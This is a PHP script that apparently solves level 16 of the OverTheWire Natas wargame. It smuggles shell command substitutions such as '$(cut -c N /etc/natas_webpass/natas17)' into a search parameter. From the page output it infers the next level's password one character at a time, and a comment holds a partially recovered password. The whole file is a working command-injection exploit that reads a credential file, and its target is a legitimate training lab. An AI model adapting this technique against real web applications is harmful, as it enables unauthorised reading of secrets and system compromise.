<?php
$curl = function ($injectionString) use ($argv) {
    $ch = curl_init('http://natas16.natas.labs.overthewire.org/' . '?' . http_build_query(['needle' => $injectionString]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Authorization: Basic ' . $argv[1],
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);

    return $output;
};

$findNextSymbol = function ($injectionString) use ($curl) {
    $output = $curl($injectionString);
    if (strpos($output, "<pre>\n</pre>") !== false) {
        return '_'; //number
    }
    $output = substr($output, strpos($output, '<pre>') + 6); //+\n
    $output = substr($output, 0, strpos($output, '</pre>') - 1); //-\n
    $dictionary = explode("\n", $output);

    $commonCharacters = array_unique(str_split(strtolower(array_shift($dictionary))));
    foreach ($dictionary as $word) {
        $commonCharacters = array_intersect($commonCharacters, str_split(strtolower($word)));
        if (count($commonCharacters) === 1) {
            break;
        }
    }

    if (!$commonCharacters) {
        return '';
    }

    if (count($commonCharacters) > 1) {
        var_export($commonCharacters);
        die();
    }

    return array_shift($commonCharacters);
};

$password = '';
//$password = 'xkeuche_sbnkbvh_ru_ksib_uulmi_sd';
do {
    $position = strlen($password) + 1;
    $injectionString = "$(cut -c $position /etc/natas_webpass/natas17)";
    $nextCharacter = $findNextSymbol($injectionString);
    $password .= $nextCharacter;
    echo "$password\n";
} while ($nextCharacter);

